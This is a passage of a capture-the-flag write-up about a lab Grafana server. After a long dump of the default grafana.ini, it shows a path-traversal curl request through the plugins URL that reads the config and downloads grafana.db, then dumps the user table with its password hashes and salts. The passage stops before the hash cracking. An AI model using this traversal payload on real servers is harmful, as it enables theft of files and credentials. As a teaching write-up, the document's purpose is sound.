;disable_brute_force_login_protection = false </span> <span class="c"># set to true if you host Grafana behind HTTPS. default is false. ;cookie_secure = false </span> <span class="c"># set cookie SameSite attribute. defaults to `lax`. can be set to "lax", "strict", "none" and "disabled" ;cookie_samesite = lax </span> <span class="c"># set to true if you want to allow browsers to render Grafana in a &lt;frame&gt;, &lt;iframe&gt;, &lt;embed&gt; or &lt;object&gt;. default is false. ;allow_embedding = false </span> <span class="c"># Set to true if you want to enable http strict transport security (HSTS) response header. # This is only sent when HTTPS is enabled in this configuration. # HSTS tells browsers that the site should only be accessed using HTTPS. ;strict_transport_security = false </span> <span class="c"># Sets how long a browser should cache HSTS. Only applied if strict_transport_security is enabled. ;strict_transport_security_max_age_seconds = 86400 </span> <span class="c"># Set to true if to enable HSTS preloading option. Only applied if strict_transport_security is enabled. ;strict_transport_security_preload = false </span> <span class="c"># Set to true if to enable the HSTS includeSubDomains option. Only applied if strict_transport_security is enabled. ;strict_transport_security_subdomains = false </span> <span class="c"># Set to true to enable the X-Content-Type-Options response header. # The X-Content-Type-Options response HTTP header is a marker used by the server to indicate that the MIME types advertised # in the Content-Type headers should not be changed and be followed. ;x_content_type_options = true </span> <span class="c"># Set to true to enable the X-XSS-Protection header, which tells browsers to stop pages from loading # when they detect reflected cross-site scripting (XSS) attacks. ;x_xss_protection = true </span> <span class="c"># Enable adding the Content-Security-Policy header to your requests. # CSP allows to control resources the user agent is allowed to load and helps prevent XSS attacks. ;content_security_policy = false </span> <span class="c"># Set Content Security Policy template used when adding the Content-Security-Policy header to your requests. # $NONCE in the template includes a random nonce. # $ROOT_PATH is server.root_url without the protocol. ;content_security_policy_template = """script-src 'self' 'unsafe-eval' 'unsafe-inline' 'strict-dynamic' $NONCE;object-src 'none';font-src 'self';style-src 'self' 'unsafe-inline' blob:;img-src * data:;base-uri 'self';connect-src 'self' grafana.com ws://$ROOT_PATH wss://$ROOT_PATH;manifest-src 'self';media-src 'none';form-action 'self';""" </span> <span class="c">#################################### Snapshots ########################### </span><span class="nn">[snapshots]</span> <span class="c"># snapshot sharing options ;external_enabled = true ;external_snapshot_url = https://snapshots-origin.raintank.io ;external_snapshot_name = Publish to snapshot.raintank.io </span> <span class="c"># Set to true to enable this Grafana instance act as an external snapshot server and allow unauthenticated requests for # creating and deleting snapshots. ;public_mode = false </span> <span class="c"># remove expired snapshot ;snapshot_remove_expired = true </span> <span class="c">#################################### Dashboards History ################## </span><span class="nn">[dashboards]</span> <span class="c"># Number dashboard versions to keep (per dashboard). Default: 20, Minimum: 1 ;versions_to_keep = 20 </span> <span class="c"># Minimum dashboard refresh interval. When set, this will restrict users to set the refresh interval of a dashboard lower than given interval. Per default this is 5 seconds. # The interval string is a possibly signed sequence of decimal numbers, followed by a unit suffix (ms, s, m, h, d), e.g. 30s or 1m. ;min_refresh_interval = 5s </span> <span class="c"># Path to the default home dashboard. If this value is empty, then Grafana uses StaticRootPath + "dashboards/home.json" ;default_home_dashboard_path = </span> <span class="c">#################################### Users ############################### </span><span class="nn">[users]</span> <span class="c"># disable user signup / registration ;allow_sign_up = true </span> <span class="c"># Allow non admin users to create organizations ;allow_org_create = true </span> <span class="c"># Set to true to automatically assign new users to the default organization (id 1) ;auto_assign_org = true </span> <span class="c"># Set this value to automatically add new users to the provided organization (if auto_assign_org above is set to true) ;auto_assign_org_id = 1 </span> <span class="c"># Default role new users will be automatically assigned (if disabled above is set to true) ;auto_assign_org_role = Viewer </span> <span class="c"># Require email validation before sign up completes ;verify_email_enabled = false </span> <span class="c"># Background text for the user field on the login page ;login_hint = email or username ;password_hint = password </span> <span class="c"># Default UI theme ("dark" or "light") ;default_theme = dark </span> <span class="c"># Path to a custom home page. Users are only redirected to this if the default home dashboard is used. It should match a frontend route and contain a leading slash. ; home_page = </span> <span class="c"># External user management, these options affect the organization users view ;external_manage_link_url = ;external_manage_link_name = ;external_manage_info = </span> <span class="c"># Viewers can edit/inspect dashboard settings in the browser. But not save the dashboard. ;viewers_can_edit = false </span> <span class="c"># Editors can administrate dashboard, folders and teams they create ;editors_can_admin = false </span> <span class="c"># The duration in time a user invitation remains valid before expiring. This setting should be expressed as a duration. Examples: 6h (hours), 2d (days), 1w (week). Default is 24h (24 hours). The minimum supported duration is 15m (15 minutes). ;user_invite_max_lifetime_duration = 24h </span> <span class="c"># Enter a comma-separated list of users login to hide them in the Grafana UI. These users are shown to Grafana admins and themselves. ; hidden_users = </span> <span class="nn">[auth]</span> <span class="c"># Login cookie name ;login_cookie_name = grafana_session </span> <span class="c"># The maximum lifetime (duration) an authenticated user can be inactive before being required to login at next visit. Default is 7 days (7d). This setting should be expressed as a duration, e.g. 5m (minutes), 6h (hours), 10d (days), 2w (weeks), 1M (month). The lifetime resets at each successful token rotation. ;login_maximum_inactive_lifetime_duration = </span> <span class="c"># The maximum lifetime (duration) an authenticated user can be logged in since login time before being required to login. Default is 30 days (30d). This setting should be expressed as a duration, e.g. 5m (minutes), 6h (hours), 10d (days), 2w (weeks), 1M (month). ;login_maximum_lifetime_duration = </span> <span class="c"># How often should auth tokens be rotated for authenticated users when being active. The default is each 10 minutes. ;token_rotation_interval_minutes = 10 </span> <span class="c"># Set to true to disable (hide) the login form, useful if you use OAuth, defaults to false ;disable_login_form = false </span> <span class="c"># Set to true to disable the sign out link in the side menu. Useful if you use auth.proxy or auth.jwt, defaults to false ;disable_signout_menu = false </span> <span class="c"># URL to redirect the user to after sign out ;signout_redirect_url = </span> <span class="c"># Set to true to attempt login with OAuth automatically, skipping the login screen. # This setting is ignored if multiple OAuth providers are configured. ;oauth_auto_login = false </span> <span class="c"># OAuth state max age cookie duration in seconds. Defaults to 600 seconds. ;oauth_state_cookie_max_age = 600 </span> <span class="c"># limit of api_key seconds to live before expiration ;api_key_max_seconds_to_live = -1 </span> <span class="c"># Set to true to enable SigV4 authentication option for HTTP-based datasources. ;sigv4_auth_enabled = false </span> <span class="c">#################################### Anonymous Auth ###################### </span><span class="nn">[auth.anonymous]</span> <span class="c"># enable anonymous access ;enabled = false </span> <span class="c"># specify organization name that should be used for unauthenticated users ;org_name = Main Org. </span> <span class="c"># specify role for unauthenticated users ;org_role = Viewer </span> <span class="c"># mask the Grafana version number for unauthenticated users ;hide_version = false </span> <span class="c">#################################### GitHub Auth ########################## </span><span class="nn">[auth.github]</span> <span class="c">;enabled = false ;allow_sign_up = true ;client_id = some_id ;client_secret = some_secret ;scopes = user:email,read:org ;auth_url = https://github.com/login/oauth/authorize ;token_url = https://github.com/login/oauth/access_token ;api_url = https://api.github.com/user ;allowed_domains = ;team_ids = ;allowed_organizations = </span> <span class="c">#################################### GitLab Auth ######################### </span><span class="nn">[auth.gitlab]</span> <span class="c">;enabled = false ;allow_sign_up = true ;client_id = some_id ;client_secret = some_secret ;scopes = api ;auth_url = https://gitlab.com/oauth/authorize ;token_url = https://gitlab.com/oauth/token ;api_url = https://gitlab.com/api/v4 ;allowed_domains = ;allowed_groups = </span> <span class="c">#################################### Google Auth ########################## </span><span class="nn">[auth.google]</span> <span class="c">;enabled = false ;allow_sign_up = true ;client_id = some_client_id ;client_secret = some_client_secret ;scopes = https://www.googleapis.com/auth/userinfo.profile https://www.googleapis.com/auth/userinfo.email ;auth_url = https://accounts.google.com/o/oauth2/auth ;token_url = https://accounts.google.com/o/oauth2/token ;api_url = https://www.googleapis.com/oauth2/v1/userinfo ;allowed_domains = ;hosted_domain = </span> <span class="c">#################################### Grafana.com Auth #################### </span><span class="nn">[auth.grafana_com]</span> <span class="c">;enabled = false ;allow_sign_up = true ;client_id = some_id ;client_secret = some_secret ;scopes = user:email ;allowed_organizations = </span> <span class="c">#################################### Azure AD OAuth ####################### </span><span class="nn">[auth.azuread]</span> <span class="c">;name = Azure AD ;enabled = false ;allow_sign_up = true ;client_id = some_client_id ;client_secret = some_client_secret ;scopes = openid email profile ;auth_url = https://login.microsoftonline.com/&lt;tenant-id&gt;/oauth2/v2.0/authorize ;token_url = https://login.microsoftonline.com/&lt;tenant-id&gt;/oauth2/v2.0/token ;allowed_domains = ;allowed_groups = </span> <span class="c">#################################### Okta OAuth ####################### </span><span class="nn">[auth.okta]</span> <span class="c">;name = Okta ;enabled = false ;allow_sign_up = true ;client_id = some_id ;client_secret = some_secret ;scopes = openid profile email groups ;auth_url = https://&lt;tenant-id&gt;.okta.com/oauth2/v1/authorize ;token_url = https://&lt;tenant-id&gt;.okta.com/oauth2/v1/token ;api_url = https://&lt;tenant-id&gt;.okta.com/oauth2/v1/userinfo ;allowed_domains = ;allowed_groups = ;role_attribute_path = ;role_attribute_strict = false </span> <span class="c">#################################### Generic OAuth ########################## </span><span class="nn">[auth.generic_oauth]</span> <span class="c">;enabled = false ;name = OAuth ;allow_sign_up = true ;client_id = some_id ;client_secret = some_secret ;scopes = user:email,read:org ;empty_scopes = false ;email_attribute_name = email:primary ;email_attribute_path = ;login_attribute_path = ;name_attribute_path = ;id_token_attribute_name = ;auth_url = https://foo.bar/login/oauth/authorize ;token_url = https://foo.bar/login/oauth/access_token ;api_url = https://foo.bar/user ;allowed_domains = ;team_ids = ;allowed_organizations = ;role_attribute_path = ;role_attribute_strict = false ;tls_skip_verify_insecure = false ;tls_client_cert = ;tls_client_key = ;tls_client_ca = </span> <span class="c">#################################### Basic Auth ########################## </span><span class="nn">[auth.basic]</span> <span class="c">;enabled = true </span> <span class="c">#################################### Auth Proxy ########################## </span><span class="nn">[auth.proxy]</span> <span class="c">;enabled = false ;header_name = X-WEBAUTH-USER ;header_property = username ;auto_sign_up = true ;sync_ttl = 60 ;whitelist = 192.168.1.1, 192.168.2.1 ;headers = Email:X-User-Email, Name:X-User-Name # Read the auth proxy docs for details on what the setting below enables ;enable_login_token = false </span> <span class="c">#################################### Auth JWT ########################## </span><span class="nn">[auth.jwt]</span> <span class="c">;enabled = true ;header_name = X-JWT-Assertion ;email_claim = sub ;username_claim = sub ;jwk_set_url = https://foo.bar/.well-known/jwks.json ;jwk_set_file = /path/to/jwks.json ;cache_ttl = 60m ;expected_claims = {"aud": ["foo", "bar"]} ;key_file = /path/to/key/file </span> <span class="c">#################################### Auth LDAP ########################## </span><span class="nn">[auth.ldap]</span> <span class="c">;enabled = false ;config_file = /etc/grafana/ldap.toml ;allow_sign_up = true </span> <span class="c"># LDAP background sync (Enterprise only) # At 1 am every day ;sync_cron = "0 0 1 * * *" ;active_sync_enabled = true </span> <span class="c">#################################### AWS ########################### </span><span class="nn">[aws]</span> <span class="c"># Enter a comma-separated list of allowed AWS authentication providers. # Options are: default (AWS SDK Default), keys (Access &amp;&amp; secret key), credentials (Credentials field), ec2_iam_role (EC2 IAM Role) ; allowed_auth_providers = default,keys,credentials </span> <span class="c"># Allow AWS users to assume a role using temporary security credentials. # If true, assume role will be enabled for all AWS authentication providers that are specified in aws_auth_providers ; assume_role_enabled = true </span> <span class="c">#################################### Azure ############################### </span><span class="nn">[azure]</span> <span class="c"># Azure cloud environment where Grafana is hosted # Possible values are AzureCloud, AzureChinaCloud, AzureUSGovernment and AzureGermanCloud # Default value is AzureCloud (i.e. public cloud) ;cloud = AzureCloud </span> <span class="c"># Specifies whether Grafana hosted in Azure service with Managed Identity configured (e.g. Azure Virtual Machines instance) # If enabled, the managed identity can be used for authentication of Grafana in Azure services # Disabled by default, needs to be explicitly enabled ;managed_identity_enabled = false </span> <span class="c"># Client ID to use for user-assigned managed identity # Should be set for user-assigned identity and should be empty for system-assigned identity ;managed_identity_client_id = </span> <span class="c">#################################### SMTP / Emailing ########################## </span><span class="nn">[smtp]</span> <span class="c">;enabled = false ;host = localhost:25 ;user = # If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;""" ;password = ;cert_file = ;key_file = ;skip_verify = false ;from_address = admin@grafana.localhost ;from_name = Grafana # EHLO identity in SMTP dialog (defaults to instance_name) ;ehlo_identity = dashboard.example.com # SMTP startTLS policy (defaults to 'OpportunisticStartTLS') ;startTLS_policy = NoStartTLS </span> <span class="nn">[emails]</span> <span class="c">;welcome_email_on_sign_up = false ;templates_pattern = emails/*.html </span> <span class="c">#################################### Logging ########################## </span><span class="nn">[log]</span> <span class="c"># Either "console", "file", "syslog". Default is console and file # Use space to separate multiple modes, e.g. "console file" ;mode = console file </span> <span class="c"># Either "debug", "info", "warn", "error", "critical", default is "info" ;level = info </span> <span class="c"># optional settings to set different levels for specific loggers. Ex filters = sqlstore:debug ;filters = </span> <span class="c"># For "console" mode only </span><span class="nn">[log.console]</span> <span class="c">;level = </span> <span class="c"># log line format, valid options are text, console and json ;format = console </span> <span class="c"># For "file" mode only </span><span class="nn">[log.file]</span> <span class="c">;level = </span> <span class="c"># log line format, valid options are text, console and json ;format = text </span> <span class="c"># This enables automated log rotate(switch of following options), default is true ;log_rotate = true </span> <span class="c"># Max line number of single file, default is 1000000 ;max_lines = 1000000 </span> <span class="c"># Max size shift of single file, default is 28 means 1 &lt;&lt; 28, 256MB ;max_size_shift = 28 </span> <span class="c"># Segment log daily, default is true ;daily_rotate = true </span> <span class="c"># Expired days of log file(delete after max days), default is 7 ;max_days = 7 </span> <span class="nn">[log.syslog]</span> <span class="c">;level = </span> <span class="c"># log line format, valid options are text, console and json ;format = text </span> <span class="c"># Syslog network type and address. This can be udp, tcp, or unix. If left blank, the default unix endpoints will be used. ;network = ;address = </span> <span class="c"># Syslog facility. user, daemon and local0 through local7 are valid. ;facility = </span> <span class="c"># Syslog tag. By default, the process' argv[0] is used. ;tag = </span> <span class="nn">[log.frontend]</span> <span class="c"># Should Sentry javascript agent be initialized ;enabled = false </span> <span class="c"># Sentry DSN if you want to send events to Sentry. ;sentry_dsn = </span> <span class="c"># Custom HTTP endpoint to send events captured by the Sentry agent to. Default will log the events to stdout. ;custom_endpoint = /log </span> <span class="c"># Rate of events to be reported between 0 (none) and 1 (all), float ;sample_rate = 1.0 </span> <span class="c"># Requests per second limit enforced an extended period, for Grafana backend log ingestion endpoint (/log). ;log_endpoint_requests_per_second_limit = 3 </span> <span class="c"># Max requests accepted per short interval of time for Grafana backend log ingestion endpoint (/log). ;log_endpoint_burst_limit = 15 </span> <span class="c">#################################### Usage Quotas ######################## </span><span class="nn">[quota]</span> <span class="c">; enabled = false </span> <span class="c">#### set quotas to -1 to make unlimited. #### # limit number of users per Org. ; org_user = 10 </span> <span class="c"># limit number of dashboards per Org. ; org_dashboard = 100 </span> <span class="c"># limit number of data_sources per Org. ; org_data_source = 10 </span> <span class="c"># limit number of api_keys per Org. ; org_api_key = 10 </span> <span class="c"># limit number of alerts per Org. ;org_alert_rule = 100 </span> <span class="c"># limit number of orgs a user can create. ; user_org = 10 </span> <span class="c"># Global limit of users. ; global_user = -1 </span> <span class="c"># global limit of orgs. ; global_org = -1 </span> <span class="c"># global limit of dashboards ; global_dashboard = -1 </span> <span class="c"># global limit of api_keys ; global_api_key = -1 </span> <span class="c"># global limit on number of logged in users. ; global_session = -1 </span> <span class="c"># global limit of alerts ;global_alert_rule = -1 </span> <span class="c">#################################### Alerting ############################ </span><span class="nn">[alerting]</span> <span class="c"># Disable alerting engine &amp; UI features ;enabled = true # Makes it possible to turn off alert rule execution but alerting UI is visible ;execute_alerts = true </span> <span class="c"># Default setting for new alert rules. Defaults to categorize error and timeouts as alerting. (alerting, keep_state) ;error_or_timeout = alerting </span> <span class="c"># Default setting for how Grafana handles nodata or null values in alerting. (alerting, no_data, keep_state, ok) ;nodata_or_nullvalues = no_data </span> <span class="c"># Alert notifications can include images, but rendering many images at the same time can overload the server # This limit will protect the server from render overloading and make sure notifications are sent out quickly ;concurrent_render_limit = 5 </span> <span class="c"># Default setting for alert calculation timeout. Default value is 30 ;evaluation_timeout_seconds = 30 </span> <span class="c"># Default setting for alert notification timeout. Default value is 30 ;notification_timeout_seconds = 30 </span> <span class="c"># Default setting for max attempts to sending alert notifications. Default value is 3 ;max_attempts = 3 </span> <span class="c"># Makes it possible to enforce a minimal interval between evaluations, to reduce load on the backend ;min_interval_seconds = 1 </span> <span class="c"># Configures for how long alert annotations are stored. Default is 0, which keeps them forever. # This setting should be expressed as a duration. Examples: 6h (hours), 10d (days), 2w (weeks), 1M (month). ;max_annotation_age = </span> <span class="c"># Configures max number of alert annotations that Grafana stores. Default value is 0, which keeps all alert annotations. ;max_annotations_to_keep = </span> <span class="c">#################################### Annotations ######################### </span><span class="nn">[annotations]</span> <span class="c"># Configures the batch size for the annotation clean-up job. This setting is used for dashboard, API, and alert annotations. ;cleanupjob_batchsize = 100 </span> <span class="nn">[annotations.dashboard]</span> <span class="c"># Dashboard annotations means that annotations are associated with the dashboard they are created on. </span> <span class="c"># Configures how long dashboard annotations are stored. Default is 0, which keeps them forever. # This setting should be expressed as a duration. Examples: 6h (hours), 10d (days), 2w (weeks), 1M (month). ;max_age = </span> <span class="c"># Configures max number of dashboard annotations that Grafana stores. Default value is 0, which keeps all dashboard annotations. ;max_annotations_to_keep = </span> <span class="nn">[annotations.api]</span> <span class="c"># API annotations means that the annotations have been created using the API without any # association with a dashboard. </span> <span class="c"># Configures how long Grafana stores API annotations. Default is 0, which keeps them forever. # This setting should be expressed as a duration. Examples: 6h (hours), 10d (days), 2w (weeks), 1M (month). ;max_age = </span> <span class="c"># Configures max number of API annotations that Grafana keeps. Default value is 0, which keeps all API annotations. ;max_annotations_to_keep = </span> <span class="c">#################################### Explore ############################# </span><span class="nn">[explore]</span> <span class="c"># Enable the Explore section ;enabled = true </span> <span class="c">#################################### Internal Grafana Metrics ########################## # Metrics available at HTTP API Url /metrics </span><span class="nn">[metrics]</span> <span class="c"># Disable / Enable internal metrics ;enabled = true # Graphite Publish interval ;interval_seconds = 10 # Disable total stats (stat_totals_*) metrics to be generated ;disable_total_stats = false </span> <span class="c">#If both are set, basic auth will be required for the metrics endpoint. ; basic_auth_username = ; basic_auth_password = </span> <span class="c"># Metrics environment info adds dimensions to the `grafana_environment_info` metric, which # can expose more information about the Grafana instance. </span><span class="nn">[metrics.environment_info]</span> <span class="c">#exampleLabel1 = exampleValue1 #exampleLabel2 = exampleValue2 </span> <span class="c"># Send internal metrics to Graphite </span><span class="nn">[metrics.graphite]</span> <span class="c"># Enable by setting the address setting (ex localhost:2003) ;address = ;prefix = prod.grafana.%(instance_name)s. </span> <span class="c">#################################### Grafana.com integration ########################## # Url used to import dashboards directly from Grafana.com </span><span class="nn">[grafana_com]</span> <span class="c">;url = https://grafana.com </span> <span class="c">#################################### Distributed tracing ############ </span><span class="nn">[tracing.jaeger]</span> <span class="c"># Enable by setting the address sending traces to jaeger (ex localhost:6831) ;address = localhost:6831 # Tag that will always be included in when creating new spans. ex (tag1:value1,tag2:value2) ;always_included_tag = tag1:value1 # Type specifies the type of the sampler: const, probabilistic, rateLimiting, or remote ;sampler_type = const # jaeger samplerconfig param # for "const" sampler, 0 or 1 for always false/true respectively # for "probabilistic" sampler, a probability between 0 and 1 # for "rateLimiting" sampler, the number of spans per second # for "remote" sampler, param is the same as for "probabilistic" # and indicates the initial sampling rate before the actual one # is received from the mothership ;sampler_param = 1 # sampling_server_url is the URL of a sampling manager providing a sampling strategy. ;sampling_server_url = # Whether or not to use Zipkin propagation (x-b3- HTTP headers). ;zipkin_propagation = false # Setting this to true disables shared RPC spans. # Not disabling is the most common setting when using Zipkin elsewhere in your infrastructure. ;disable_shared_zipkin_spans = false </span> <span class="c">#################################### External image storage ########################## </span><span class="nn">[external_image_storage]</span> <span class="c"># Used for uploading images to public servers so they can be included in slack/email messages. # you can choose between (s3, webdav, gcs, azure_blob, local) ;provider = </span> <span class="nn">[external_image_storage.s3]</span> <span class="c">;endpoint = ;path_style_access = ;bucket = ;region = ;path = ;access_key = ;secret_key = </span> <span class="nn">[external_image_storage.webdav]</span> <span class="c">;url = ;public_url = ;username = ;password = </span> <span class="nn">[external_image_storage.gcs]</span> <span class="c">;key_file = ;bucket = ;path = </span> <span class="nn">[external_image_storage.azure_blob]</span> <span class="c">;account_name = ;account_key = ;container_name = </span> <span class="nn">[external_image_storage.local]</span> <span class="c"># does not require any configuration </span> <span class="nn">[rendering]</span> <span class="c"># Options to configure a remote HTTP image rendering service, e.g. using https://github.com/grafana/grafana-image-renderer. # URL to a remote HTTP image renderer service, e.g. http://localhost:8081/render, will enable Grafana to render panels and dashboards to PNG-images using HTTP requests to an external service. ;server_url = # If the remote HTTP image renderer service runs on a different server than the Grafana server you may have to configure this to a URL where Grafana is reachable, e.g. http://grafana.domain/. ;callback_url = # Concurrent render request limit affects when the /render HTTP endpoint is used. Rendering many images at the same time can overload the server, # which this setting can help protect against by only allowing a certain amount of concurrent requests. ;concurrent_render_request_limit = 30 </span> <span class="nn">[panels]</span> <span class="c"># If set to true Grafana will allow script tags in text panels. Not recommended as it enable XSS vulnerabilities. ;disable_sanitize_html = false </span> <span class="nn">[plugins]</span> <span class="c">;enable_alpha = false ;app_tls_skip_verify_insecure = false # Enter a comma-separated list of plugin identifiers to identify plugins that are allowed to be loaded even if they lack a valid signature. ;allow_loading_unsigned_plugins = # Enable or disable installing plugins directly from within Grafana. ;plugin_admin_enabled = false ;plugin_admin_external_manage_enabled = false ;plugin_catalog_url = https://grafana.com/grafana/plugins/ </span> <span class="c">#################################### Grafana Live ########################################## </span><span class="nn">[live]</span> <span class="c"># max_connections to Grafana Live WebSocket endpoint per Grafana server instance. See Grafana Live docs # if you are planning to make it higher than default 100 since this can require some OS and infrastructure # tuning. 0 disables Live, -1 means unlimited connections. ;max_connections = 100 </span> <span class="c">#################################### Grafana Image Renderer Plugin ########################## </span><span class="nn">[plugin.grafana-image-renderer]</span> <span class="c"># Instruct headless browser instance to use a default timezone when not provided by Grafana, e.g. when rendering panel image of alert. # See ICU’s metaZones.txt (https://cs.chromium.org/chromium/src/third_party/icu/source/data/misc/metaZones.txt) for a list of supported # timezone IDs. Fallbacks to TZ environment variable if not set. ;rendering_timezone = </span> <span class="c"># Instruct headless browser instance to use a default language when not provided by Grafana, e.g. when rendering panel image of alert. # Please refer to the HTTP header Accept-Language to understand how to format this value, e.g. 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5'. ;rendering_language = </span> <span class="c"># Instruct headless browser instance to use a default device scale factor when not provided by Grafana, e.g. when rendering panel image of alert. # Default is 1. Using a higher value will produce more detailed images (higher DPI), but will require more disk space to store an image. ;rendering_viewport_device_scale_factor = </span> <span class="c"># Instruct headless browser instance whether to ignore HTTPS errors during navigation. Per default HTTPS errors are not ignored. Due to # the security risk it's not recommended to ignore HTTPS errors. ;rendering_ignore_https_errors = </span> <span class="c"># Instruct headless browser instance whether to capture and log verbose information when rendering an image. Default is false and will # only capture and log error messages. When enabled, debug messages are captured and logged as well. # For the verbose information to be included in the Grafana server log you have to adjust the rendering log level to debug, configure # [log].filter = rendering:debug. ;rendering_verbose_logging = </span> <span class="c"># Instruct headless browser instance whether to output its debug and error messages into running process of remote rendering service. # Default is false. This can be useful to enable (true) when troubleshooting. ;rendering_dumpio = </span> <span class="c"># Additional arguments to pass to the headless browser instance. Default is --no-sandbox. The list of Chromium flags can be found # here (https://peter.sh/experiments/chromium-command-line-switches/). Multiple arguments is separated with comma-character. ;rendering_args = </span> <span class="c"># You can configure the plugin to use a different browser binary instead of the pre-packaged version of Chromium. # Please note that this is not recommended, since you may encounter problems if the installed version of Chrome/Chromium is not # compatible with the plugin. ;rendering_chrome_bin = </span> <span class="c"># Instruct how headless browser instances are created. Default is 'default' and will create a new browser instance on each request. # Mode 'clustered' will make sure that only a maximum of browsers/incognito pages can execute concurrently. # Mode 'reusable' will have one browser instance and will create a new incognito page on each request. ;rendering_mode = </span> <span class="c"># When rendering_mode = clustered you can instruct how many browsers or incognito pages can execute concurrently. Default is 'browser' # and will cluster using browser instances. # Mode 'context' will cluster using incognito pages. ;rendering_clustering_mode = # When rendering_mode = clustered you can define maximum number of browser instances/incognito pages that can execute concurrently.. ;rendering_clustering_max_concurrency = </span> <span class="c"># Limit the maximum viewport width, height and device scale factor that can be requested. ;rendering_viewport_max_width = ;rendering_viewport_max_height = ;rendering_viewport_max_device_scale_factor = </span> <span class="c"># Change the listening host and port of the gRPC server. Default host is 127.0.0.1 and default port is 0 and will automatically assign # a port not in use. ;grpc_host = ;grpc_port = </span> <span class="nn">[enterprise]</span> <span class="c"># Path to a valid Grafana Enterprise license.jwt file ;license_path = </span> <span class="nn">[feature_toggles]</span> <span class="c"># enable features, separated by spaces ;enable = </span> <span class="nn">[date_formats]</span> <span class="c"># For information on what formatting patterns that are supported https://momentjs.com/docs/#/displaying/ </span> <span class="c"># Default system date format used in time range picker and other places where full time is displayed ;full_date = YYYY-MM-DD HH:mm:ss </span> <span class="c"># Used by graph and other places where we only show small intervals ;interval_second = HH:mm:ss ;interval_minute = HH:mm ;interval_hour = MM/DD HH:mm ;interval_day = MM/DD ;interval_month = YYYY-MM ;interval_year = YYYY </span> <span class="c"># Experimental feature ;use_browser_locale = false </span> <span class="c"># Default timezone for user preferences. Options are 'browser' for the browser local timezone or a timezone name from IANA Time Zone database, e.g. 'UTC' or 'Europe/Amsterdam' etc. ;default_timezone = browser </span> <span class="nn">[expressions]</span> <span class="c"># Enable or disable the expressions functionality. ;enabled = true </span></code></pre></div></div> <p>This is extremely long. I’ll use <code class="language-plaintext highlighter-rouge">grep</code> to remove commented lines and empty lines:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">--path-as-is</span> http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"^[#;</span><span class="se">\[</span><span class="s2">]"</span> | <span class="nb">grep</span> <span class="nb">.</span> <span class="go"> % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 37098 100 37098 0 0 132k 0 --:--:-- --:--:-- --:--:-- 132k </span></code></pre></div></div> <p>Nothing. It’s a completely default config.</p> <p>The default database is SQLite:</p> <div class="language-ini highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#################################### Database #################################### </span><span class="nn">[database]</span> <span class="c"># You can configure the database connection by specifying type, host, name, user and password # as separate properties or as on string using the url properties. </span> <span class="c"># Either "mysql", "postgres" or "sqlite3", it's your choice ;type = sqlite3 ;host = 127.0.0.1:3306 ;name = grafana ;user = root </span><span class="err">...</span><span class="nn">[snip]</span><span class="err">...</span> <span class="c"># For "sqlite3" only, path relative to data_path setting ;path = grafana.db </span></code></pre></div></div> <p>The file is named <code class="language-plaintext highlighter-rouge">grafana.db</code>. The <code class="language-plaintext highlighter-rouge">Paths</code> section says where:</p> <div class="language-ini highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#################################### Paths #################################### </span><span class="nn">[paths]</span> <span class="c"># Path to where grafana can store temp files, sessions, and the sqlite3 db (if that is used) ;data = /var/lib/grafana </span></code></pre></div></div> <p>I’ll download the DB file:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">--path-as-is</span> http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db <span class="nt">-o</span> grafana.db <span class="go"> % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 584k 100 584k 0 0 803k 0 --:--:-- --:--:-- --:--:-- 803k </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>file grafana.db <span class="go">grafana.db: SQLite 3.x database, last written using SQLite version 3035004, file counter 424, database pages 146, cookie 0x109, schema 4, UTF-8, version-valid-for 424 </span></code></pre></div></div> <h3 id="recover-password">Recover Password</h3> <h4 id="database-enumeration">Database Enumeration</h4> <p>There are a fair number of tables in the DB:</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="n">sqlite3</span> <span class="n">grafana</span><span class="p">.</span><span class="n">db</span> <span class="go">SQLite version 3.45.1 2024-01-30 16:01:20 Enter ".help" for usage hints. </span><span class="gp">sqlite&gt;</span><span class="w"> </span><span class="p">.</span><span class="n">tables</span> <span class="go">alert login_attempt alert_configuration migration_log alert_instance org alert_notification org_user alert_notification_state playlist alert_rule playlist_item alert_rule_tag plugin_setting alert_rule_version preferences annotation quota annotation_tag server_lock api_key session cache_data short_url dashboard star dashboard_acl tag dashboard_provisioning team dashboard_snapshot team_member dashboard_tag temp_user dashboard_version test_data data_source user library_element user_auth library_element_connection user_auth_token </span></code></pre></div></div> <p>There are two users in the <code class="language-plaintext highlighter-rouge">user</code> table:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sqlite&gt; </span><span class="p">.</span><span class="n">headers</span> <span class="k">on</span> <span class="gp">sqlite&gt; </span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="k">user</span><span class="p">;</span> <span class="go">id|version|login|email|name|password|salt|rands|company|org_id|is_admin|email_verified|theme|created|updated|help_flags1|last_seen_at|is_disabled 1|0|admin|admin@localhost||7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|hLLY6QQ4Y6||1|1|0||2022-01-23 12:48:04|2022-01-23 12:48:50|0|2022-01-23 12:48:50|0 2|0|boris|boris@data.vl|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w||1|0|0||2022-01-23 12:49:11|2022-01-23 12:49:11|0|2012-01-23 12:49:11|0 </span></code></pre></div></div> <h4 id="format-hash">Format Hash</h4> <p>Grafana stores hashes in a non-standard 